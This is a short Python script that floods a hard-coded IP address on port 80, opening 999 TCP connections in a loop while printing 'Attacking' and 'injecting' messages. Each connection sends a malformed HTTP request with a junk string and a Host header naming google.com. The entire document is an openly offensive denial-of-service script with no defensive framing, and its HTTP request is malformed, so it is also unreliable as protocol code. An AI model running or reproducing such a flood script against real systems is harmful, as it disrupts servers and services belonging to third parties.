import socket, sys, os  
ip = "185.229.118.198"
port = 80
print (" Attacking " + ip  + " ... ")  
print ("injecting " + ip)
def attack():  
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((ip, port))  
    print (">> GET /" + ip + " HTTP/1.1")
    s.send(b"GET / www.google.comHTTP/1.1\r\n")
    s.send(b"kanjutku")
    s.send(b"Host: www.google.com\r\n\r\n")  
    s.close()  
for i in range(1, 1000):  
    attack()